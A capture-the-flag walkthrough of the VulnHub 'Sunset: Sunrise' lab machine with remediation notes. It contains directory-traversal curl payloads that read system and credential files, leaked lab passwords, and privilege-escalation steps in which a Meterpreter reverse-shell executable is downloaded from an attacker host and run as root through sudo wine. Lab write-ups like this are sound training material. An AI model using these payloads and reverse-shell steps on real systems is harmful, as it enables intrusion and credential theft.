# Sunset: Sunrise: CTF Walkthrough

**Target:** Sunset: Sunrise by whitecr0wz
**Difficulty:** Beginner-Intermediate
**Goal:** Get root and read the root flag
**Source:** [VulnHub](https://www.vulnhub.com/entry/sunset-sunrise,406/)

---

## Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                        ATTACK KILL CHAIN                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. RECONNAISSANCE                                                  │
│  ┌──────────────┐                                                   │
│  │  netdiscover  │──── 192.168.1.197 (Target)                      │
│  └──────┬───────┘                                                   │
│         │                                                           │
│  2. ENUMERATION                                                     │
│  ┌──────▼───────┐   ┌────────────────────────────────┐             │
│  │   nmap -A    │──▶│ 22/SSH  80/Apache  3306/MySQL  │             │
│  └──────┬───────┘   │ 8080/Weborf 0.12.2             │             │
│         │           └────────────────────────────────┘             │
│         │                                                           │
│  ┌──────▼───────┐   ┌────────────────────────────────┐             │
│  │ searchsploit │──▶│ Exploit 14925: Directory Travers│             │
│  └──────┬───────┘   └────────────────────────────────┘             │
│         │                                                           │
│  3. EXPLOITATION                                                    │
│  ┌──────▼───────┐   ┌────────────────────────────────┐             │
│  │  Dir Travers │──▶│ /etc/passwd, user.txt          │             │
│  │  (..%2f)     │   │ .mysql_history → creds leaked  │             │
│  └──────┬───────┘   └────────────────────────────────┘             │
│         │                                                           │
│  4. SSH ACCESS                                                      │
│  ┌──────▼───────┐   ┌────────────────────────────────┐             │
│  │ ssh weborf   │──▶│ MySQL enum → sunrise creds      │             │
│  │ iheartrainb44│   │ thefutureissobrightigottawearshad│            │
│  └──────┬───────┘   └────────────────────────────────┘             │
│         │                                                           │
│  5. PRIVESC                                                         │
│  ┌──────▼───────┐   ┌────────────────────────────────┐             │
│  │  sudo wine   │──▶│ Meterpreter payload as root     │             │
│  └──────┬───────┘   └────────────────────────────────┘             │
│         │                                                           │
│  ┌──────▼───────┐                                                   │
│  │  ROOT FLAG   │                                                   │
│  │  cat root.txt│                                                   │
│  └──────────────┘                                                   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 1. Reconnaissance

### Network Discovery

```bash
netdiscover -r 192.168.1.0/24
```

| IP Address | MAC Address | Vendor |
|------------|-------------|--------|
| 192.168.1.197 | 08:00:27:xx:xx:xx | VirtualBox |

### Port Scanning

```bash
nmap -A -p- 192.168.1.197
```

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22 | open | SSH | OpenSSH 7.9p1 |
| 80 | open | HTTP | Apache 2.4.38 |
| 3306 | open | MySQL | MySQL 5.7.26 |
| 8080 | open | HTTP | Weborf 0.12.2 |

---

## 2. Enumeration

### Port 80: Apache

Default Apache2 Debian page. Nothing useful in the source code.

### Port 8080: Weborf

Weborf 0.12.2 is an extremely lightweight web server written in Vala for the GNOME project. The directory listing is enabled by default.

```
http://192.168.1.197:8080/
```

### Searchsploit Lookup

```bash
searchsploit weborf
```

| Exploit | Title | Version |
|---------|-------|---------|
| 14925 | Weborf 0.12.2: Directory Traversal | 0.12.2 |

The exploit leverages `..%2f` (URL-encoded `../`) to traverse directories outside the web root.

---

## 3. Exploitation: Directory Traversal

### Step 1: Read /etc/passwd

```bash
curl "http://192.168.1.197:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
```

<details>
<summary>/etc/passwd (output)</summary>

```
root:x:0:0:root:/root:/bin/bash
...
sunrise:x:1000:1000:sunrise,,,:/home/sunrise:/bin/bash
weborf:x:1001:1001:weborf,,,:/home/weborf:/bin/bash
```

</details>

### Step 2: Read User Flag

```bash
curl "http://192.168.1.197:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/sunrise/user.txt"
```

```
flag{d1f3459c6d04b48c69f15f0e60b7073c}
```

### Step 3: Enumerate weborf's Home Directory

```bash
curl "http://192.168.1.197:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/weborf/"
```

### Step 4: Directory Brute-Force

```bash
dirb http://192.168.1.197:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f home/weborf/
```

Key finding:

```
+ http://192.168.1.197:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/.mysql_history
```

### Step 5: MySQL Credential Leak

```bash
curl "http://192.168.1.197:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/.mysql_history"
```

Output:

```
...enter password: iheartrainbows44...
...grant all privileges on sunrise_db.* to weborf@localhost identified by 'iheartrainbows44';
...flush privileges;
```

| User | Password | Access |
|------|----------|--------|
| weborf | iheartrainbows44 | MySQL, SSH |

---

## 4. SSH Access via MySQL Credential Leak

### SSH into the Target

```bash
ssh weborf@192.168.1.197
# Password: iheartrainbows44
```

### MySQL Enumeration

```bash
mysql -u weborf -p
# Password: iheartrainbows44
```

```sql
SHOW DATABASES;
USE mysql;
SHOW TABLES;
SELECT * FROM user;
```

Key finding in the `mysql.user` table:

| Host | User | authentication_string |
|------|------|-----------------------|
| localhost | sunrise | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |

After cracking or direct lookup:

| User | Password |
|------|----------|
| sunrise | thefutureissobrightigottawearshades |

### Switch to sunrise

```bash
su sunrise
# Password: thefutureissobrightigottawearshades
```

---

## 5. MySQL Enumeration: sudo Check

```bash
sudo -l
```

```
User sunrise may run the following commands on this host:
    (root) /usr/bin/wine
```

Key finding: sunrise can run `/usr/bin/wine` as root with sudo.

---

## 6. Privilege Escalation: Wine + sudo

### Step 1: Generate MSFPC Payload (Attacker)

```bash
msfpc windows 192.168.1.107
```

| Parameter | Value |
|-----------|-------|
| Payload | windows/meterpreter/reverse_tcp |
| LHOST | 192.168.1.107 |
| LPORT | 443 |
| Output | windows-meterpreter-staged-reverse-tcp-443.exe |

### Step 2: Host the Payload (Attacker)

```bash
python2 -m SimpleHTTPServer 8080
```

### Step 3: Start Handler (Attacker)

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.107; set LPORT 443; exploit"
```

### Step 4: Download and Execute (Target)

```bash
wget http://192.168.1.107:8080/windows-meterpreter-staged-reverse-tcp-443.exe
sudo wine windows-meterpreter-staged-reverse-tcp-443.exe
```

### Step 5: Capture Root Flag

```bash
meterpreter > cd /root
meterpreter > cat root.txt
```

```
flag{8e0e345d761c6c5553a8b3a90042003c}
```

---

## Flags Captured

| Flag | Location | Value |
|------|----------|-------|
| User | /home/sunrise/user.txt | `flag{d1f3459c6d04b48c69f15f0e60b7073c}` |
| Root | /root/root.txt | `flag{8e0e345d761c6c5553a8b3a90042003c}` |

---

## Remediation Notes

| # | Vulnerability | Risk | Remediation |
|---|--------------|------|-------------|
| 1 | Weborf directory traversal (CVE-?) | Critical | Update Weborf to the latest version or remove from production. Directory listing and traversal should never be exposed. |
| 2 | .mysql_history in web root | High | Ensure dotfiles are excluded from web serving. Delete MySQL history files after use: `rm ~/.mysql_history`. |
| 3 | Hardcoded MySQL credentials | Critical | Rotate all affected credentials. Avoid storing passwords in plaintext in grant statements. |
| 4 | sudo wine as root | High | Remove wine from sudoers. No application should require wine running as root. Implement least-privilege sudo policies. |
| 5 | Weborf version disclosure | Medium | Suppress server version in HTTP response headers. Remove `ServerTokens Full` or equivalent. |
| 6 | Default Apache page on port 80 | Low | Remove the default index.html and configure virtual hosts properly. |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| netdiscover | Network discovery and ARP scanning |
| nmap | Port scanning and service enumeration |
| searchsploit | Exploit-DB offline search |
| curl | HTTP requests and directory traversal testing |
| dirb | Directory and file brute-forcing |
| mysql | Database enumeration and credential extraction |
| msfpc | MSF Payload Creator for generating meterpreter payloads |
| msfconsole | Metasploit Framework console for handler setup |
| SimpleHTTPServer | Python-based HTTP server for payload delivery |
| wine | Windows binary compatibility layer (abused for privesc) |

---

*Walkthrough completed. Always practice on authorized targets only.*
